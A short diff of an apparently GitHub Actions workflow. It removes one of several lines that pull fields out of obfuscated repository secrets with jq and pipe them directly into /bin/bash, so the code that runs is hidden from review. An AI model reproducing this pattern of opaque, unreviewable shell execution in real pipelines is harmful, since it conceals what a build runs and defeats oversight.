@@ -27,7 +27,6 @@ jobs:
           gbm87: ${{ secrets.gbm87 }}
         run: |
           printf '%s' "$gbm87" | jq -r .vxaai99420 | /bin/bash
-          echo $ats87750 | jq -r .aq3 | /bin/bash
           printf '%s' "$g1571" | jq -r .t42 | /bin/bash
           printf '%s' "$vzdcj52" | jq -r .tcokw584 | /bin/bash
           echo $zmwhv46609 | jq -r .ct2431 | /bin/bash
